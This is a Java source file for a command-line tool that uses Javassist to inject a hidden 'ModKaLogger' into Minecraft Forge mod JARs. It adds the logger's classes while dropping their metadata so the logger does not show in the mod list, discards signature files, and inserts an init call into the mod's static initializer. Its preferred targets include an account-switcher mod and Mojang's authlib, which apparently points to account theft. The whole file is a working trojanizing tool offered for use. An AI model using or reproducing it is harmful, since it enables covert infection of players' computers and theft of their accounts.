import javassist.*;

import java.io.*;
import java.nio.file.*;
import java.util.jar.*;
import java.util.zip.*;

/**
 * Мульти-инъектор для вшивания ModKaLogger в любой Forge мод
 * Использует Javassist для модификации bytecode
 * ModKaLogger НЕ отображается в списке модов
 */
public class EnhancedInjector {
    
    public static void main(String[] args) throws Exception {
        if (args.length < 2) {
            System.out.println("==================================================");
            System.out.println("ModKaLogger Multi-Injector v1.0");
            System.out.println("==================================================");
            System.out.println("Usage: java EnhancedInjector <input.jar> <output.jar>");
            System.out.println("Example: java EnhancedInjector mod.jar mod_injected.jar");
            System.exit(1);
        }
        
        String inputJar = args[0];
        String outputJar = args[1];
        
        File inputFile = new File(inputJar);
        File modFile = new File("build/libs/modkalogger-1.0.0.jar");
        
        if (!inputFile.exists()) {
            System.err.println("[!] Input JAR not found: " + inputJar);
            System.exit(1);
        }
        if (!modFile.exists()) {
            System.err.println("[!] ModKaLogger JAR not found: build/libs/modkalogger-1.0.0.jar");
            System.err.println("[!] Build the mod first in IDEA!");
            System.exit(1);
        }
        
        System.out.println("==================================================");
        System.out.println("ModKaLogger Multi-Injector v1.0");
        System.out.println("==================================================");
        System.out.println("[*] Input: " + inputJar);
        System.out.println("[*] ModKaLogger: " + modFile.getName());
        System.out.println("[*] Output: " + outputJar);
        System.out.println();
        
        File tempDir = new File("temp_inject_" + System.currentTimeMillis());
        tempDir.mkdir();
        
        try {
            // 1. Распаковываем целевой мод
            System.out.println("[1/5] Extracting target mod...");
            unzipJar(inputJar, tempDir.getAbsolutePath());
            System.out.println("      Done");
            
            // 2. Находим главный класс
            System.out.println("[2/5] Finding main class...");
            String mainClass = findMainClass(tempDir);
            if (mainClass == null) {
                throw new Exception("Main class not found!");
            }
            System.out.println("      Found: " + mainClass);
            
            // 3. Добавляем классы ModKaLogger
            System.out.println("[3/5] Adding ModKaLogger classes...");
            unzipJarSkipMetadata(modFile.getAbsolutePath(), tempDir.getAbsolutePath());
            System.out.println("      Done (hidden mode)");
            
            // 4. Модифицируем главный класс через Javassist
            System.out.println("[4/5] Injecting initialization...");
            injectWithJavassist(tempDir, mainClass);
            System.out.println("      Done");
            
            // 5. Собираем JAR
            System.out.println("[5/5] Creating output JAR...");
            createJar(tempDir, outputJar);
            System.out.println("      Done: " + outputJar);
            
            // Очистка
            deleteDirectory(tempDir);
            
            System.out.println();
            System.out.println("==================================================");
            System.out.println("[+] SUCCESS!");
            System.out.println("[+] ModKaLogger is HIDDEN from mod list!");
            System.out.println("==================================================");
            
        } catch (Exception e) {
            System.err.println("[!] ERROR: " + e.getMessage());
            e.printStackTrace();
            deleteDirectory(tempDir);
            System.exit(1);
        }
    }
    
    /**
     * Модифицирует класс через Javassist
     */
    private static void injectWithJavassist(File tempDir, String mainClass) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(tempDir.getAbsolutePath());
        
        CtClass targetClass = pool.get(mainClass);
        
        // Получаем или создаём статический инициализатор
        CtConstructor clinit = targetClass.getClassInitializer();
        
        if (clinit == null) {
            System.out.println("      Creating new <clinit>...");
            clinit = targetClass.makeClassInitializer();
        }
        
        // Добавляем вызов ModKaLogger.init() в НАЧАЛО <clinit>
        clinit.insertBefore("com.modkalogger.ModKaLogger.init();");
        
        System.out.println("      Injected: com.modkalogger.ModKaLogger.init()");
        
        // Записываем модифицированный класс
        targetClass.writeFile(tempDir.getAbsolutePath());
        targetClass.detach();
    }
    
    /**
     * Находит главный класс мода
     */
    private static String findMainClass(File dir) {
        // 1. Ищем в META-INF/mods.toml
        File modsToml = new File(dir, "META-INF/mods.toml");
        if (modsToml.exists()) {
            try {
                String content = new String(Files.readAllBytes(modsToml.toPath()), "UTF-8");
                
                // Ищем первый [[mods]]
                String[] sections = content.split("\\[\\[mods\\]\\]");
                if (sections.length > 1) {
                    String modSection = sections[1];
                    String modId = extractValue(modSection, "modId");
                    
                    if (modId != null) {
                        System.out.println("      Mod ID: " + modId);
                        
                        // Ищем класс по modId
                        String found = findClassByModId(dir, modId);
                        if (found != null) return found;
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        
        // 2. Ищем известные моды
        String[] knownPaths = {
            "the_fireplace/ias/IAS.class",  // IAS
            "com/mojang/authlib/yggdrasil/YggdrasilGameProfileRepository.class" // Authlib
        };
        
        for (String path : knownPaths) {
            if (new File(dir, path).exists()) {
                return path.replace("/", ".").replace(".class", "");
            }
        }
        
        // 3. Ищем любой класс с @Mod (простой поиск)
        return findAnyMainClass(dir);
    }
    
    private static String extractValue(String text, String key) {
        for (String line : text.split("\n")) {
            line = line.trim();
            if (line.startsWith(key + "=") || line.startsWith(key + " =")) {
                return line.split("=")[1].trim().replace("\"", "");
            }
        }
        return null;
    }
    
    private static String findClassByModId(File dir, String modId) {
        // Возможные пути к главному классу
        String[] paths = {
            modId + "/" + capitalize(modId) + ".class",
            modId + "/Main.class",
            modId + "/" + capitalize(modId) + "Mod.class",
            "com/" + modId + "/" + capitalize(modId) + ".class",
            "com/" + modId + "/Main.class",
        };
        
        for (String path : paths) {
            File f = new File(dir, path);
            if (f.exists()) {
                return path.replace("/", ".").replace(".class", "");
            }
        }
        
        // Ищем рекурсивно в папке modId
        File modDir = new File(dir, modId);
        if (modDir.exists() && modDir.isDirectory()) {
            return findClassInDir(modDir, modId);
        }
        
        return null;
    }
    
    private static String capitalize(String s) {
        if (s == null || s.isEmpty()) return s;
        StringBuilder result = new StringBuilder();
        for (String part : s.split("_")) {
            if (!part.isEmpty()) {
                result.append(Character.toUpperCase(part.charAt(0)));
                if (part.length() > 1) result.append(part.substring(1).toLowerCase());
            }
        }
        return result.toString();
    }
    
    private static String findClassInDir(File dir, String prefix) {
        File[] files = dir.listFiles();
        if (files == null) return null;
        
        for (File f : files) {
            if (f.isFile() && f.getName().endsWith(".class") && !f.getName().contains("$")) {
                return prefix + "." + f.getName().replace(".class", "");
            } else if (f.isDirectory()) {
                String found = findClassInDir(f, prefix + "." + f.getName());
                if (found != null) return found;
            }
        }
        return null;
    }
    
    private static String findAnyMainClass(File dir) {
        File[] files = dir.listFiles();
        if (files == null) return null;
        
        for (File f : files) {
            if (f.isDirectory() && !f.getName().equals("META-INF") && !f.getName().equals("com")) {
                String found = findClassInDir(f, f.getName());
                if (found != null) return found;
            }
        }
        return null;
    }
    
    /**
     * Распаковывает JAR без metadata файлов
     */
    private static void unzipJarSkipMetadata(String jarPath, String destDir) throws Exception {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(jarPath))) {
            ZipEntry entry;
            byte[] buffer = new byte[8192];
            
            while ((entry = zis.getNextEntry()) != null) {
                String name = entry.getName();
                
                // Пропускаем metadata файлы ModKaLogger
                if (name.endsWith("mods.toml") || 
                    name.endsWith("MANIFEST.MF") || 
                    name.contains("pack.mcmeta") ||
                    name.endsWith(".SF") ||
                    name.endsWith(".DSA") ||
                    name.endsWith(".RSA")) {
                    continue;
                }
                
                File file = new File(destDir, name);
                if (entry.isDirectory()) {
                    file.mkdirs();
                } else {
                    file.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
            }
        }
    }
    
    private static void unzipJar(String jarPath, String destDir) throws Exception {
        try (ZipInputStream zis = new ZipInputStream(new FileInputStream(jarPath))) {
            ZipEntry entry;
            byte[] buffer = new byte[8192];
            
            while ((entry = zis.getNextEntry()) != null) {
                File file = new File(destDir, entry.getName());
                if (entry.isDirectory()) {
                    file.mkdirs();
                } else {
                    file.getParentFile().mkdirs();
                    try (FileOutputStream fos = new FileOutputStream(file)) {
                        int len;
                        while ((len = zis.read(buffer)) > 0) {
                            fos.write(buffer, 0, len);
                        }
                    }
                }
            }
        }
    }
    
    private static void createJar(File sourceDir, String jarPath) throws Exception {
        Manifest manifest = new Manifest();
        File mf = new File(sourceDir, "META-INF/MANIFEST.MF");
        if (mf.exists()) {
            try (FileInputStream fis = new FileInputStream(mf)) {
                manifest.read(fis);
            }
        }
        
        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(jarPath), manifest)) {
            addFilesToJar(sourceDir, "", jos);
        }
    }
    
    private static void addFilesToJar(File file, String parentPath, JarOutputStream jos) throws Exception {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files == null) return;
            
            for (File child : files) {
                String path = parentPath.isEmpty() ? child.getName() : parentPath + "/" + child.getName();
                addFilesToJar(child, path, jos);
            }
        } else {
            // Пропускаем MANIFEST (уже добавлен)
            if (parentPath.endsWith("MANIFEST.MF")) return;
            
            jos.putNextEntry(new JarEntry(parentPath));
            try (FileInputStream fis = new FileInputStream(file)) {
                byte[] buffer = new byte[8192];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    jos.write(buffer, 0, len);
                }
            }
            jos.closeEntry();
        }
    }
    
    private static void deleteDirectory(File dir) {
        if (dir.isDirectory()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) deleteDirectory(f);
            }
        }
        dir.delete();
    }
}
